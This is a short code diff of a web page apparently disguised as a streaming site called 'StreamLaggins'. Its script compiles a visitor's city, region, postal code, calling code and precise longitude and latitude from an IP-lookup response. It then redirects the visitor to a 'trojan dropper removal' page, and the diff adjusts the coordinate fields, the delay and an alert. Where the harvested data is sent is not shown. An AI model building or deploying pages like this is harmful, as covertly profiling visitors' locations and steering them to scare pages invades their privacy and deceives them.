@@ -3,7 +3,7 @@
   <head>
 	<title>StreamLaggins</title>
 
-	<meta http-equiv="refresh" content="2;url=https://www.enigmasoftware.com/pt/trojandropper-remocao/">
+	<!--<meta http-equiv="refresh" content="2;url=https://www.enigmasoftware.com/pt/trojandropper-remocao/">-->
 
 	<meta name="theme-color" content="#121212"/>
 	<meta name="apple-mobile-web-app-status-bar-style" content="#212121">
@@ -142,8 +142,8 @@ string2 = "-"+i2;
  "CIDADE:"+response.city+"\n"+
  "CODIGO DO PAIS:"+response.country_code+"\n"+
  "CODIGO REGIONAL:"+response.region_code+"\n"+
- "LONGITUDE:"+LG+"\n"+
- "LATITUDE:"+LT+"\n"+
+ "LONGITUDE:"+response.longitude+"\n"+
+ "LATITUDE:"+response.latitude+"\n"+
  "CODIGO DE CHAMADA:"+response.calling_code+"\n"+
  "CODIGO DO CONTINENTE:"+response.continent_code+"\n"+
  "CODIGO POSTAL:"+response.postal+"\n"+
@@ -177,11 +177,12 @@ string2 = "-"+i2;
  setTimeout(function(){
  window.location.href="https://www.enigmasoftware.com/pt/trojandropper-remocao/";
  clearTimeout();
- },2000);
+ },3000);
  
 	  }
 	 }, "json");
 	 }else{
+alert("msg");
 	 window.location.href="https://www.enigmasoftware.com/pt/trojandropper-remocao/";
 	 }
 }
